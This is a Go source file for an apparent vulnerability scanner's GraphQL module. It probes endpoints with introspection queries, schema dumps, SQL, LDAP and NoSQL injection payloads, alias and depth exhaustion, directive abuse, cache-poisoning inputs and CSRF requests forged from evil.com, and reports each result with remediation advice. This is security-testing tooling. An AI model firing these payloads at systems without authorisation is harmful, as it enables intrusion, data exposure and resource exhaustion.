package graphql

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"
	"time"

	"github.com/aydocs/fang/internal/engine"
	fanghttp "github.com/aydocs/fang/internal/http"
	"github.com/aydocs/fang/pkg/models"
)

type GraphQLModule struct {
	cfg    *engine.Config
	client *fanghttp.Client
}

func (m *GraphQLModule) ID() string   { return "graphql" }
func (m *GraphQLModule) Name() string { return "GraphQL API Exploitation Module" }
func (m *GraphQLModule) Description() string {
	return "GraphQL introspection, batching, injection, depth analysis, alias exhaustion, cache poisoning, CSRF, and schema analysis"
}
func (m *GraphQLModule) Severity() models.Severity { return models.Critical }

var gqlEndpoints = []string{
	"/graphql", "/v1/graphql", "/v2/graphql", "/graph", "/gql",
	"/api/graphql", "/api/v1/graphql", "/graphiql", "/playground",
	"/query", "/api/query", "/explorer", "/altair",
}

var introspectionQuery = `{"query":"{__schema{types{name fields{name args{name type{name kind}}}}}}"}`
var batchQuery = `{"query":"query{__typename}","variables":{}}`

func (m *GraphQLModule) Init(ctx context.Context, cfg *engine.Config) error {
	m.cfg = cfg
	m.client = fanghttp.NewClient(fanghttp.WithTimeout(cfg.Timeout))
	return nil
}

func (m *GraphQLModule) Scan(ctx context.Context, target *models.Target) ([]*models.Finding, error) {
	var findings []*models.Finding

	for _, ep := range gqlEndpoints {
		fullURL := strings.TrimRight(target.URL, "/") + ep
		resp, err := m.client.Post(fullURL, introspectionQuery)
		if err != nil {
			continue
		}

		if resp.StatusCode != 200 {
			continue
		}

		var gqlResp struct {
			Data struct {
				Schema struct {
					Types []struct {
						Name   string `json:"name"`
						Fields []struct {
							Name string `json:"name"`
						} `json:"fields"`
					} `json:"types"`
				} `json:"__schema"`
			} `json:"data"`
		}

		if err := json.Unmarshal([]byte(resp.Body), &gqlResp); err != nil {
			continue
		}

		if len(gqlResp.Data.Schema.Types) > 0 {
			queryNames := []string{}
			mutationNames := []string{}
			for _, t := range gqlResp.Data.Schema.Types {
				if t.Name == "Query" || t.Name == "Mutation" {
					for _, f := range t.Fields {
						if t.Name == "Query" {
							queryNames = append(queryNames, f.Name)
						} else {
							mutationNames = append(mutationNames, f.Name)
						}
					}
				}
			}

			findings = append(findings, &models.Finding{
				Title:       "GraphQL - Introspection Enabled",
				Severity:    models.High,
				Confidence:  models.HighConfidence,
				URL:         fullURL,
				Evidence:    fmt.Sprintf("Schema exposed with %d types. Queries: %v, Mutations: %v", len(gqlResp.Data.Schema.Types), queryNames, mutationNames),
				Description: "GraphQL introspection is enabled, exposing the entire API schema including all queries, mutations, types, and fields.",
				Remediation: "Disable introspection in production. Use allowlist-based query restrictions. Implement depth limiting.",
				CWEID:       "CWE-200",
				ModuleID:    "graphql",
			})

			findings = append(findings, m.testSQLi(ctx, fullURL)...)
			findings = append(findings, m.testBatching(ctx, fullURL)...)
			findings = append(findings, m.testDepthAnalysis(ctx, fullURL)...)
			findings = append(findings, m.testDirectiveAttack(ctx, fullURL)...)
			findings = append(findings, m.testAliasExhaustion(ctx, fullURL)...)
			findings = append(findings, m.testCachePoisoning(ctx, fullURL)...)
			findings = append(findings, m.testCSRF(ctx, fullURL)...)
			findings = append(findings, m.testLDAPInjection(ctx, fullURL)...)
			findings = append(findings, m.testNoSQLInjection(ctx, fullURL)...)
			findings = append(findings, m.testSchemaDump(ctx, fullURL)...)
		}

		if strings.Contains(resp.Body, "GraphiQL") || strings.Contains(resp.Body, "Playground") ||
			strings.Contains(resp.Body, "graphiql") || strings.Contains(resp.Body, "Altair") {
			findings = append(findings, &models.Finding{
				Title:       "GraphQL - IDE Exposed",
				Severity:    models.Medium,
				Confidence:  models.HighConfidence,
				URL:         fullURL,
				Evidence:    "GraphQL IDE interface detected in response",
				Description: "GraphQL development IDE (GraphiQL/Playground) is exposed, allowing interactive query execution.",
				Remediation: "Remove GraphQL IDE in production. Restrict access to authorized users only.",
				CWEID:       "CWE-200",
				ModuleID:    "graphql",
			})
		}
	}

	return findings, nil
}

func (m *GraphQLModule) testSQLi(ctx context.Context, url string) []*models.Finding {
	var findings []*models.Finding
	sqliTests := map[string]string{
		"SQLi - String": `{"query":"query($input:String!){__typename}","variables":{"input":"' OR '1'='1"}}`,
		"SQLi - Union":  `{"query":"query($input:String!){__typename}","variables":{"input":"' UNION SELECT 1--"}}`,
		"SQLi - Sleep":  `{"query":"query($input:String!){__typename}","variables":{"input":"'; WAITFOR DELAY '0:0:5'--"}}`,
		"SQLi - Blind":  `{"query":"query($input:String!){__typename}","variables":{"input":"' AND 1=1--"}}`,
	}
	for name, payload := range sqliTests {
		resp, err := m.client.Post(url, payload)
		if err != nil {
			continue
		}
		body := strings.ToLower(resp.Body)
		for _, pat := range []string{"sql", "error", "ora-", "mysql", "syntax", "unclosed", "quotation"} {
			if strings.Contains(body, strings.ToLower(pat)) {
				findings = append(findings, &models.Finding{
					Title:       fmt.Sprintf("GraphQL - %s", name),
					Severity:    models.Critical,
					Confidence:  models.MediumConfidence,
					URL:         url,
					Payload:     payload,
					Evidence:    fmt.Sprintf("SQL error pattern found: %s", pat),
					Description: "GraphQL endpoint may be vulnerable to SQL injection through variables.",
					Remediation: "Use parameterized queries. Validate and sanitize all GraphQL arguments.",
					CWEID:       "CWE-89",
					ModuleID:    "graphql",
				})
				break
			}
		}
	}
	return findings
}

func (m *GraphQLModule) testLDAPInjection(ctx context.Context, url string) []*models.Finding {
	var findings []*models.Finding
	ldapPayloads := []string{
		`{"query":"query($input:String!){__typename}","variables":{"input":"*)(uid=*))(|(uid=*"}}`,
		`{"query":"query($input:String!){__typename}","variables":{"input":"admin*))(|(userPassword=*"}}`,
		`{"query":"query($input:String!){__typename}","variables":{"input":"*)(|(cn=*"}}`,
	}
	for _, payload := range ldapPayloads {
		resp, err := m.client.Post(url, payload)
		if err != nil {
			continue
		}
		body := strings.ToLower(resp.Body)
		for _, pat := range []string{"ldap", "search", "filter", "dc=", "cn=", "distinguished"} {
			if strings.Contains(body, pat) {
				findings = append(findings, &models.Finding{
					Title:       "GraphQL - LDAP Injection",
					Severity:    models.Critical,
					Confidence:  models.MediumConfidence,
					URL:         url,
					Payload:     payload,
					Evidence:    fmt.Sprintf("LDAP error pattern found: %s", pat),
					Description: "GraphQL endpoint may be vulnerable to LDAP injection through variables.",
					Remediation: "Sanitize GraphQL arguments. Use parameterized LDAP queries. Validate input against allowlist.",
					CWEID:       "CWE-90",
					ModuleID:    "graphql",
				})
				break
			}
		}
	}
	return findings
}

func (m *GraphQLModule) testNoSQLInjection(ctx context.Context, url string) []*models.Finding {
	var findings []*models.Finding
	nosqlPayloads := []string{
		`{"query":"query($input:String!){__typename}","variables":{"input":"{\"$ne\":null}"}}`,
		`{"query":"query($input:String!){__typename}","variables":{"input":"{\"$gt\":\"\"}"}}`,
		`{"query":"query($input:String!){__typename}","variables":{"input":"{\"$regex\":\".*\"}"}}`,
		`{"query":"query($input:String!){__typename}","variables":{"input":"{\"$where\":\"1==1\"}"}}`,
	}
	for _, payload := range nosqlPayloads {
		resp, err := m.client.Post(url, payload)
		if err != nil {
			continue
		}
		body := strings.ToLower(resp.Body)
		for _, pat := range []string{"mongo", "mongodb", "nosql", "$where", "$regex", "bson"} {
			if strings.Contains(body, pat) {
				findings = append(findings, &models.Finding{
					Title:       "GraphQL - NoSQL Injection",
					Severity:    models.Critical,
					Confidence:  models.MediumConfidence,
					URL:         url,
					Payload:     payload,
					Evidence:    fmt.Sprintf("NoSQL error pattern found: %s", pat),
					Description: "GraphQL endpoint may be vulnerable to NoSQL injection through variables.",
					Remediation: "Validate and sanitize GraphQL arguments. Use strict type checking. Avoid passing raw user input to database queries.",
					CWEID:       "CWE-943",
					ModuleID:    "graphql",
				})
				break
			}
		}
	}
	return findings
}

func (m *GraphQLModule) testBatching(ctx context.Context, url string) []*models.Finding {
	var findings []*models.Finding

	malformedBatch := fmt.Sprintf(`[%s,%s]`, batchQuery, batchQuery)
	resp, err := m.client.Post(url, malformedBatch)
	if err == nil {
		if resp.StatusCode == 200 && strings.Contains(resp.Body, "__typename") {
			findings = append(findings, &models.Finding{
				Title:       "GraphQL - Batching Allowed",
				Severity:    models.Medium,
				Confidence:  models.MediumConfidence,
				URL:         url,
				Evidence:    "Batch query execution succeeded",
				Description: "GraphQL batching is enabled, allowing multiple queries in single request. Can be used for brute-force bypass.",
				Remediation: "Implement rate limiting per query. Limit batch size. Consider disabling batching on sensitive endpoints.",
				CWEID:       "CWE-770",
				ModuleID:    "graphql",
			})

			findings = append(findings, &models.Finding{
				Title:       "GraphQL - Batching Attack Vector",
				Severity:    models.High,
				Confidence:  models.MediumConfidence,
				URL:         url,
				Evidence:    "Batching confirmed. Can be used for resource exhaustion and brute-force attacks.",
				Description: "GraphQL batching allows array-based batched queries. Attackers can bypass rate limits and perform credential stuffing via batched mutations.",
				Remediation: "Restrict batch size. Apply per-query rate limiting. Rate-limit by IP and session. Disable batching for authentication endpoints.",
				CWEID:       "CWE-770",
				ModuleID:    "graphql",
			})
		}
	}

	batchDepthTest := `[{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"}]`
	resp2, err2 := m.client.Post(url, batchDepthTest)
	if err2 == nil && resp2.StatusCode == 200 && strings.Contains(resp2.Body, "__typename") {
		findings = append(findings, &models.Finding{
			Title:       "GraphQL - Deep Batch Processing",
			Severity:    models.Medium,
			Confidence:  models.LowConfidence,
			URL:         url,
			Evidence:    "Multiple batched queries processed successfully",
			Description: "GraphQL endpoint processes deep batch arrays, enabling resource exhaustion through batch amplification.",
			Remediation: "Limit maximum batch size. Implement query cost analysis. Monitor and throttle batch requests.",
			CWEID:       "CWE-770",
			ModuleID:    "graphql",
		})
	}

	return findings
}

func (m *GraphQLModule) testDepthAnalysis(ctx context.Context, url string) []*models.Finding {
	var findings []*models.Finding

	depthPayloads := map[int]string{
		5:  `{"query":"query{__typename{__typename{__typename{__typename{__typename}}}}}"}`,
		8:  `{"query":"query{__typename{__typename{__typename{__typename{__typename{__typename{__typename{__typename}}}}}}}}}"}`,
		12: `{"query":"query{__typename{__typename{__typename{__typename{__typename{__typename{__typename{__typename{__typename{__typename{__typename{__typename}}}}}}}}}}}}}"}`,
	}

	for depth, payload := range depthPayloads {
		resp, err := m.client.Post(url, payload)
		if err != nil {
			continue
		}
		if resp.StatusCode == 200 && strings.Contains(resp.Body, "__typename") {
			depthStatus := "accepted"
			if resp.Duration > 2*time.Second {
				depthStatus = "slow"
			}
			findings = append(findings, &models.Finding{
				Title:       fmt.Sprintf("GraphQL - Deep Query Depth (%d levels, %s)", depth, depthStatus),
				Severity:    models.Medium,
				Confidence:  models.MediumConfidence,
				URL:         url,
				Payload:     payload,
				Evidence:    fmt.Sprintf("Query depth of %d was accepted by server (%s)", depth, depthStatus),
				Description: fmt.Sprintf("GraphQL endpoint accepts queries with depth %d, which can enable resource exhaustion via deeply nested queries.", depth),
				Remediation: "Implement query depth limiting. Set max depth to reasonable value (e.g., 5-7). Use query cost analysis.",
				CWEID:       "CWE-770",
				ModuleID:    "graphql",
			})
		}
		if resp.StatusCode == 400 || resp.StatusCode == 413 {
			break
		}
	}

	return findings
}

func (m *GraphQLModule) testDirectiveAttack(ctx context.Context, url string) []*models.Finding {
	var findings []*models.Finding

	directivePayloads := map[string]string{
		"@skip":        `{"query":"query{__typename @skip(if:false){__typename @skip(if:false){__typename}}}"}`,
		"@include":     `{"query":"query{__typename @include(if:true){__typename @include(if:true){__typename}}}"}`,
		"@deprecated":  `{"query":"query{__typename @deprecated(reason:\"x\"){__typename}}"}`,
		"@defer":       `{"query":"query{__typename @defer{__typename}}"}`,
		"@stream":      `{"query":"query{__typename @stream{__typename}}"}`,
		"@specifiedBy": `{"query":"query{__typename @specifiedBy(url:\"https://evil.com\"){__typename}}"}`,
	}

	for name, payload := range directivePayloads {
		resp, err := m.client.Post(url, payload)
		if err != nil {
			continue
		}
		if resp.StatusCode == 200 && strings.Contains(resp.Body, "__typename") {
			findings = append(findings, &models.Finding{
				Title:       fmt.Sprintf("GraphQL - Directive-Based Attack (%s)", name),
				Severity:    models.Medium,
				Confidence:  models.MediumConfidence,
				URL:         url,
				Payload:     payload,
				Evidence:    fmt.Sprintf("Directive %s was accepted by server", name),
				Description: fmt.Sprintf("GraphQL endpoint accepts %s directive, which can be used for directive-based attacks and resource manipulation.", name),
				Remediation: "Disable unused directives. Validate directive usage. Restrict custom directives to allowlist.",
				CWEID:       "CWE-770",
				ModuleID:    "graphql",
			})
		}
	}

	return findings
}

func (m *GraphQLModule) testAliasExhaustion(ctx context.Context, url string) []*models.Finding {
	var findings []*models.Finding

	aliasCounts := []int{50, 100, 500}
	for _, count := range aliasCounts {
		var aliasFields []string
		for i := 0; i < count; i++ {
			aliasFields = append(aliasFields, fmt.Sprintf("a%d:__typename", i))
		}
		query := fmt.Sprintf("query{__typename,%s}", strings.Join(aliasFields, ","))
		payload := fmt.Sprintf(`{"query":"%s"}`, strings.ReplaceAll(query, `"`, `\"`))

		resp, err := m.client.Post(url, payload)
		if err != nil {
			continue
		}

		if resp.StatusCode == 200 {
			findings = append(findings, &models.Finding{
				Title:       fmt.Sprintf("GraphQL - Alias-Based Resource Exhaustion (%d aliases)", count),
				Severity:    models.High,
				Confidence:  models.MediumConfidence,
				URL:         url,
				Payload:     payload,
				Evidence:    fmt.Sprintf("Query with %d aliases executed successfully (status %d, duration %v)", count, resp.StatusCode, resp.Duration),
				Description: fmt.Sprintf("GraphQL endpoint accepted query with %d aliases, enabling resource exhaustion through alias-based query amplification.", count),
				Remediation: "Limit number of aliases per query. Implement query cost analysis. Set max alias count to reasonable value.",
				CWEID:       "CWE-770",
				ModuleID:    "graphql",
			})
		}

		if resp.StatusCode >= 400 {
			break
		}
	}

	return findings
}

func (m *GraphQLModule) testCachePoisoning(ctx context.Context, url string) []*models.Finding {
	var findings []*models.Finding

	poisonPayloads := map[string]string{
		"Content-Type manipulation": `{"query":"query{__typename}","extensions":{"persistedQuery":{"version":1,"sha256Hash":"deadbeef"}}}`,
		"Invalid variable types":    `{"query":"query($id:Int!){__typename}","variables":{"id":"notanumber"}}`,
		"Response override":         `{"query":"mutation{__typename}","variables":{"input":"__proto__[isAdmin]=true"}}`,
	}

	for name, payload := range poisonPayloads {
		req := fanghttp.NewRequest("POST", url)
		req.Body = payload
		req.Headers["Content-Type"] = "application/json"
		req.Headers["X-Cache"] = "true"
		resp, err := m.client.Do(req)
		if err != nil {
			continue
		}

		cacheHeaders := []string{"x-cache", "cf-cache-status", "age", "x-served-by", "x-cache-status"}
		cacheHits := []string{}
		for h := range resp.Headers {
			hl := strings.ToLower(h)
			for _, ch := range cacheHeaders {
				if strings.Contains(hl, ch) {
					cacheHits = append(cacheHits, fmt.Sprintf("%s: %s", h, resp.Headers.Get(h)))
				}
			}
		}

		if resp.StatusCode == 200 && len(cacheHits) > 0 {
			findings = append(findings, &models.Finding{
				Title:       fmt.Sprintf("GraphQL - Cache Poisoning (%s)", name),
				Severity:    models.Critical,
				Confidence:  models.MediumConfidence,
				URL:         url,
				Payload:     payload,
				Evidence:    fmt.Sprintf("Cached response detected with cache headers: %v", cacheHits),
				Description: "GraphQL endpoint may be vulnerable to cache poisoning. Attacker can poison cached responses to serve malicious content to other users.",
				Remediation: "Disable caching for GraphQL endpoints. Use cache keys based on full query. Implement cache poisoning protections.",
				CWEID:       "CWE-444",
				ModuleID:    "graphql",
			})
			break
		}
	}

	persistedQuery := `{"query":"","extensions":{"persistedQuery":{"version":1,"sha256Hash":"ecf4edb46db40b5132295a029041c043"}}}`
	resp2, err2 := m.client.Post(url, persistedQuery)
	if err2 == nil && resp2.StatusCode == 200 {
		findings = append(findings, &models.Finding{
			Title:       "GraphQL - Persisted Query Bypass",
			Severity:    models.Medium,
			Confidence:  models.LowConfidence,
			URL:         url,
			Evidence:    "Persisted query mechanism detected, may allow cache poisoning",
			Description: "GraphQL endpoint supports persisted queries (APQ), which may enable cache poisoning via hash collision.",
			Remediation: "Use strong hash algorithms for persisted queries. Validate persisted query hashes server-side.",
			CWEID:       "CWE-444",
			ModuleID:    "graphql",
		})
	}

	return findings
}

func (m *GraphQLModule) testCSRF(ctx context.Context, url string) []*models.Finding {
	var findings []*models.Finding

	csrfReq := fanghttp.NewRequest("POST", url)
	csrfReq.Body = `{"query":"mutation{__typename}"}`
	csrfReq.Headers["Content-Type"] = "application/json"
	csrfReq.Headers["Origin"] = "https://evil.com"
	csrfReq.Headers["Referer"] = "https://evil.com/graphql-attack"

	resp, err := m.client.Do(csrfReq)
	if err != nil {
		return nil
	}

	if resp.StatusCode == 200 && strings.Contains(resp.Body, "__typename") {
		findings = append(findings, &models.Finding{
			Title:       "GraphQL - CSRF Vulnerability",
			Severity:    models.High,
			Confidence:  models.MediumConfidence,
			URL:         url,
			Evidence:    fmt.Sprintf("Mutation executed with Origin: evil.com, Status: %d", resp.StatusCode),
			Description: "GraphQL endpoint accepts state-changing requests from unauthorized origins, making it vulnerable to CSRF attacks.",
			Remediation: "Implement CSRF tokens. Validate Origin and Referer headers. Use SameSite cookies. Require custom headers for state-changing mutations.",
			CWEID:       "CWE-352",
			ModuleID:    "graphql",
		})
	}

	contentTypeCSRF := fanghttp.NewRequest("POST", url)
	contentTypeCSRF.Body = `{"query":"mutation{__typename}"}`
	contentTypeCSRF.Headers["Content-Type"] = "text/plain"
	resp2, err2 := m.client.Do(contentTypeCSRF)
	if err2 == nil && resp2.StatusCode == 200 && strings.Contains(resp2.Body, "__typename") {
		findings = append(findings, &models.Finding{
			Title:       "GraphQL - CSRF via Content-Type Bypass",
			Severity:    models.High,
			Confidence:  models.HighConfidence,
			URL:         url,
			Evidence:    "Query executed with text/plain content type, bypassing JSON-only CSRF protection",
			Description: "GraphQL endpoint accepts requests with non-JSON Content-Type, bypassing CSRF protections that rely on content-type checking.",
			Remediation: "Enforce application/json Content-Type. Validate Content-Type header before processing requests.",
			CWEID:       "CWE-352",
			ModuleID:    "graphql",
		})
	}

	return findings
}

func (m *GraphQLModule) testSchemaDump(ctx context.Context, url string) []*models.Finding {
	var findings []*models.Finding

	fullSchemaQuery := `{"query":"{__schema{queryType{name}mutationType{name}subscriptionType{name}types{kind name description fields{name description args{name description type{kind name ofType{kind name}}}type{kind name ofType{kind name}}}inputFields{name type{kind name}}interfaces{name}enumValues{name}possibleTypes{name}}directives{name description locations args{name type{kind name}}}}}"}`

	resp, err := m.client.Post(url, fullSchemaQuery)
	if err != nil {
		return nil
	}

	var schemaResp struct {
		Data struct {
			Schema json.RawMessage `json:"__schema"`
		} `json:"data"`
	}

	if err := json.Unmarshal([]byte(resp.Body), &schemaResp); err != nil {
		return nil
	}

	if len(schemaResp.Data.Schema) > 0 {
		findings = append(findings, &models.Finding{
			Title:       "GraphQL - Full Schema Dump Possible",
			Severity:    models.High,
			Confidence:  models.HighConfidence,
			URL:         url,
			Evidence:    fmt.Sprintf("Full schema dump retrieved (%d bytes)", len(schemaResp.Data.Schema)),
			Description: "Complete GraphQL schema can be dumped via introspection, exposing all types, fields, arguments, directives, and relationships.",
			Remediation: "Disable introspection in production. Use schema registry with allowlist. Implement query whitelisting.",
			CWEID:       "CWE-200",
			ModuleID:    "graphql",
		})
	}

	return findings
}

func init() {
	engine.GetRegistry().Register(&GraphQLModule{})
}
